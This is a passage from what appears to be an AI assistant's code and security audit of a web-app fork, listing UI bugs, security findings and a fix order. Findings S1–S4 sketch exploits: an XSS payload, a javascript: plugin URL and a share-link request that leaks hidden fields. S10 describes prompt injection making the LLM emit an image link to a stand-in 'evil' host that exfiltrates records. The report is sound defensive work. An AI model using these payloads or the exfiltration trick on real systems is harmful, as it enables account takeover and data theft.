+  chunk does updated[updated.length-1].content on an empty array (line 359), and the TypeError crashes the panel. If the user switches back to Local AI
+  instead, the old chunks are appended to restored history and saved that way.
+
+  Medium
+
+  ┌─────┬─────────────────────────────────────────────────────────────────────────┬─────────────────────────────────────────────────────────────────────┐
+  │  #  │                                  Where                                  │                          Defect → failure                           │
+  ├─────┼─────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
+  │     │                                                                         │ "Add to chat" stores row indexes per base, then resolves them       │
+  │ B3  │ ChatPanel.tsx:112-129 [fork]                                            │ against the current table and view. Switching table or re-sorting   │
+  │     │                                                                         │ sends the LLM different rows and columns than the user picked.      │
+  ├─────┼─────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
+  │     │                                                                         │ Pressing Enter while a reply streams: the submit button is          │
+  │ B4  │ components/ai-elements/prompt-input.tsx:826-838, 917-935, 1126-1166     │ type="button", so the guard misses, handleSubmit returns early, and │
+  │     │ [fork]                                                                  │  PromptInput clears the draft anyway. The user's typed follow-up is │
+  │     │                                                                         │  lost.                                                              │
+  ├─────┼─────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
+  │     │                                                                         │ PromptInput's own drag-and-drop and paste handlers accept files     │
+  │ B5  │ ChatInputArea.tsx:208-211 [fork]                                        │ that are never shown and never sent. A dropped PDF is silently      │
+  │     │                                                                         │ thrown away.                                                        │
+  ├─────┼─────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
+  │     │                                                                         │ Uploads are checked with an exact MIME match. On Windows, .md       │
+  │ B6  │ ChatPanel.tsx:220 with types.ts:35-45 [fork]                            │ reports "" and .csv reports application/vnd.ms-excel, so files the  │
+  │     │                                                                         │ picker offers get rejected.                                         │
+  ├─────┼─────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
+  │     │ features/app/blocks/view/tool-bar/ai-context.utils.ts:237-255, 280-289  │ The curl examples use --data-urlencode without -G, which POSTs to   │
+  │ B7  │ [fork]                                                                  │ the create-records endpoint. The create example also has a //       │
+  │     │                                                                         │ comment inside the JSON. Copied commands fail.                      │
+  ├─────┼─────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
+  │     │                                                                         │ The OAuth result de-dupe drops any result identical to the previous │
+  │ B8  │ features/app/blocks/email/hooks.ts:80-85 [fork]                         │  one for the component's whole lifetime. A second cancel, or        │
+  │     │                                                                         │ reconnecting the same account, leaves the dialog on "Waiting for    │
+  │     │                                                                         │ authorization…" forever.                                            │
+  ├─────┼─────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
+  │     │                                                                         │ Each rebuild clones nodes without x/y/z, so the force layout        │
+  │ B9  │ features/app/blocks/base-graph/BaseGraphCanvas.tsx:340-356 and          │ restarts and the focus effect sends the camera to (0,0,0). This     │
+  │     │ utils/buildSimulationGraph.ts:117-119 [fork]                            │ breaks ?focus= links and focusing after a record edit. Toggling a   │
+  │     │                                                                         │ legend entry also re-lays out the whole graph.                      │
+  ├─────┼─────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
+  │     │                                                                         │ The graph schema is cached for 5 minutes, and neither the Refresh   │
+  │ B10 │ base-graph/useGraphData.ts:295-302 [fork]                               │ button nor pack install invalidates it. New tables don't appear in  │
+  │     │                                                                         │ the graph.                                                          │
+  ├─────┼─────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
+  │     │                                                                         │ HelpModal is mounted only in BaseLayout, but UserNav and            │
+  │ B11 │ features/app/layouts/BaseLayout.tsx:87 [fork]                           │ SideBarFooter open it from the space, settings and share layouts    │
+  │     │                                                                         │ too. Help does nothing there, then pops up on the next visit to a   │
+  │     │                                                                         │ base.                                                               │
+  └─────┴─────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────┘
+
+  Low
+
+  - Email ([fork]):
+    - Nothing handles a blocked or closed OAuth popup, and there's no timeout (CreateEmailTableDialog.tsx:224).
+    - Every mounted useOAuthPopup reacts to every broadcast in every tab, causing stray error toasts and dialogs jumping steps.
+    - SMTP credentials entered without a host are silently dropped. An empty port becomes 0, and ports above 65535 are accepted
+      (ImapConnectForm.tsx:165,209).
+    - The Outlook preset uses implicit TLS on 465, but Office 365 needs STARTTLS on 587.
+    - Number inputs snap to 1 when cleared and accept decimals. The folder picker has no 20-folder cap.
+    - Choosing another account doesn't clear the old error.
+    - Deleting an integration doesn't invalidate email-source status.
+    - "Reconnect" sends an integrationId the backend ignores.
+    - EmailSyncStatus polls /email/sources every 60s on every table page, even in bases with no email tables.
+  - Auth:
+    - The 2FA code input rejects pasted " 123456" or "123 456", because there's no pasteTransformer (features/auth/components/TwoFactorCodeInput.tsx:18).
+    - The settings 2FA dialog shows every INVALID_CAPTCHA as "invalid code", with no "expired, resend" hint.
+    - SignForm.tsx:141 doesn't handle TOO_MANY_REQUESTS with seconds, so it shows the raw English message.
+    - LoginPage.tsx:27 has decodeURIComponent outside a try/catch, so ?redirect=%25 crashes the login page [upstream].
+  - Chat / admin ([fork]):
+    - Restoring thread history is never cancelled and can wipe a just-sent message (ChatPanel.tsx:165-178).
+    - "Settings saved." is shown before the mutation resolves, and the rejection goes unhandled (AppBuilderConfig.tsx:21-28).
+    - LLMApiConfigStep.tsx:126-151 blocks navigation by throwing a string, which triggers the dev overlay and also fires on shallow route changes.
+  - Graph / onboarding ([fork]):
+    - Saved presets aren't zod-validated, so a corrupt localStorage entry crashes hierarchyOf and GraphQueryPanel.
+    - Sprite labels are cached by node id, so renamed records keep their old labels.
+    - The canvas uses h-screen inside a padded panel, so about 18px is clipped.
+    - The wizard causes a hydration mismatch when the page is refreshed mid-onboarding.
+    - Skip stays enabled during a pack build, which creates a second base.
+    - fg._destructor?.() is dead code.
+  - Help / MCP / misc:
+    - Scraped help HTML has 31 /en/basic/... links that 404, and it still downloads about 30 hidden images from mintcdn.com.
+    - McpPage.tsx:40 shows skeletons forever when the request fails.
+    - 13 stray console.log calls (for example BrandingLogo.tsx:27, invite/index.tsx:42, plugin hooks).
+
+  ---
+
+  3. Security
+
+  High
+
+  #: S1
+  Where: features/app/blocks/base-graph/BaseGraphCanvas.tsx:395/405 and BaseGraphCanvas2D.tsx:449/459 [fork]
+  Issue: Stored XSS. nodeLabel returns the raw primary-field value. float-tooltip@1.7.5 renders string content with .html(), which I confirmed in its dist
+  file, and the backend's labelOf doesn't escape.                             
+  Exploit: An editor sets a record's primary value to <img src=x onerror=…>. Any collaborator who hovers that node in the graph runs the script in their own
+
+  session.
+  ────────────────────────────────────────
+  #: S2
+  Where: features/app/components/notifications/notification-component/LinkNotification.tsx:60,68 [upstream]
+  Issue: Stored XSS. The notification text is rendered with dangerouslySetInnerHTML. i18next escaping is off: the block in next-i18next.config.js:43-47 is
+  commented out, so the default escapeValue:false applies. The substituted values (fromUserName, fieldName, tableName) are free text.
+  Exploit: A collaborator renames a field to an HTML payload, then mentions the victim. The script runs when the victim opens their notifications.
+  ────────────────────────────────────────
+  #: S3
+  Where: features/app/components/plugin/hooks/iframe-url/* and IframePluginRender.tsx:71 [upstream]
+  Issue: Plugin URL allows javascript:. There's no protocol allow-list on create or update, no sandbox on the iframe, and any logged-in user can create and
+  install their own plugin.
+  Exploit: A javascript:fetch('/api/…')// plugin on a dashboard runs in the parent origin for every member, and for anonymous share viewers too.
+  ────────────────────────────────────────
+  #: S4
+  Where: apps/nestjs-backend/src/features/share/share.service.ts:255 [upstream, backend]
+  Issue: Hidden-field leak on share links. projection: query?.projection ?? visibleFields trusts the caller, and filter can be overridden the same way.
+  Hidden field IDs are exposed in view.columnMeta, including in __NEXT_DATA__.
+  Exploit: Anyone with the share link calls GET /api/share/{id}/view/records?projection[]=fldHidden and gets the hidden column's values.
+
+  Medium
+
+  #: S5
+  Where: pages/base/[baseId]/[[...slug]].tsx:51, all pages/share/**, share-base-ssr.ts:84             
+  Issue: setHeader('Content-Security-Policy', 'frame-ancestors *;') replaces the entire CSP. The main logged-in app page therefore runs with no script-src
+  (so nothing blocks S1–S3) and can be framed by any site, with X-Frame-Options ignored. The session cookie also has no explicit SameSite.
+  ────────────────────────────────────────
+  #: S6 
+  Where: apps/nextjs-app/next.config.js:78-110           
+  Issue: Where the CSP does apply, it is weak: 'unsafe-inline' 'unsafe-eval', upstream *.teable.io/.ai/.cn script hosts this deployment doesn't control,
+  frame-src *, and img-src of any http/https. There's no Permissions-Policy even though voice input uses the microphone, and HSTS lasts 4 days. As a side
+  effect, GA and a custom UMAMI_URL are blocked by the CSP.
+  ────────────────────────────────────────               
+  #: S7 
+  Where: apps/nextjs-app/instrumentation.ts:15-38
+  Issue: onRequestError sends the full request headers, including cookie, to Sentry. _app.tsx:63 also sends the user's email. Anyone with read access to the
+
+  Sentry project can hijack sessions.
+  ────────────────────────────────────────
+  #: S8
+  Where: apps/nestjs-backend/.../auth/social/controller.adapter.ts:19-23 vs strategies/local.strategy.ts:34
+  Issue: Email 2FA only covers password login. GitHub, Google and OIDC sign-ins skip the challenge, and the settings UI doesn't say so.
+  ────────────────────────────────────────
+  #: S9
+  Where: apps/nextjs-app/.env.example [fork]
+  Issue: The fork spells out literal storage, access-token and mail encryption keys and IVs, plus SECRET_KEY=defaultSecretKey. These match the backend's
+  hardcoded fallbacks, and nothing enforces overriding them in production.
+  ────────────────────────────────────────
+  #: S10
+  Where: components/ai-elements/message.tsx:275-281, reasoning.tsx:202 [fork]
+  Issue: Streamdown's defaults allow images from any host. Raw HTML is sanitized, so script injection isn't possible, but an injected prompt in an uploaded
+  file or record can make the LLM output ![](https://evil/?d=<records>), which leaks data automatically when the image loads. Restrict
+  allowedImagePrefixes.
+  ────────────────────────────────────────
+  #: S11
+  Where: features/app/blocks/view/tool-bar/APIDialogContent.tsx:292-310 with ai-context.utils.ts:216,318
+  Issue: "Generate token" creates a one-year read/write token and embeds it in the "Copy AI doc" text meant for third-party chatbots. A new token is minted
+  on every click and never revoked.
+
+  Low
+
+  - The Local AI chat history (chat-history:${baseId}) and chat-agent:${baseId} aren't scoped to the user and aren't cleared on logout. On a shared browser,
+    user B sees user A's conversation and record data.
+  - components/Metrics.tsx:36,106 sends the raw user email to GA and Clarity (PII).
+  - Production source maps are on unless the tracked .env turns them off (next.config.js:27-29).
+  Low
+
+  - The Local AI chat history (chat-history:${baseId}) and chat-agent:${baseId} aren't scoped to the user and aren't cleared on logout. On a shared browser, user B sees user A's conversation
+    and record data.
+  - components/Metrics.tsx:36,106 sends the raw user email to GA and Clarity (PII).
+  - Production source maps are on unless the tracked .env turns them off (next.config.js:27-29).
+  - nanoid@3.3.7 is affected by CVE-2024-55565 (low impact here). @radix-ui/react-accordion is unpinned (^).
+
+  Checked and clean:
+  - isValidRedirectPath rejects //host, /\host and javascript:.
+  - The server-side axios client can't be pointed elsewhere (no SSRF).
+  - OAuth state is random, single-use and uses PKCE. The callback postMessage checks the origin.
+  - No IMAP/SMTP secrets are returned to the client.
+  - No secrets are committed in tracked frontend files.
+  - MarkdownPreview uses rehype-sanitize. The Streamdown HTML path is sanitized.
+
+  ---
+
+  4. Suggested fix order
+
+  1. S1 and S2 (XSS):
+     - Build tooltip labels as an HTMLElement with textContent.
+     - Turn on interpolation.escapeValue: true, or sanitize the notification HTML with DOMPurify.
+  2. S5: append frame-ancestors to the existing CSP instead of replacing it, and drop it on /base/*. This puts the CSP back as a second line of defence.
+  3. S3 and S4:
+     - Allow only http(s) plugin URLs and add sandbox to the iframe.
+     - Intersect the share projection and filter with the visible fields, and strip columnMeta from share responses.
+  4. S7 and S9: remove cookie and authorization before sending errors to Sentry, and fail startup when default secrets are in use in production.
+  5. B1, B2 and B4 (chat panel):
+     - Add key={baseId} on the table page, or reset state when baseId changes.
+     - Abort the stream and disable the selector when switching agent.
+     - Fix the Enter-while-streaming guard.
+  6. S8: decide whether 2FA should cover social logins, or label it "password sign-in only".
+  7. Clean-up: delete the unused ai-elements and components/ui, delete the committed .claude-flow files and update .gitignore, fix the lint error, and raise the timeout on the 2 flaky tests.
+
+  I haven't changed any code. I saved a short summary of these findings t
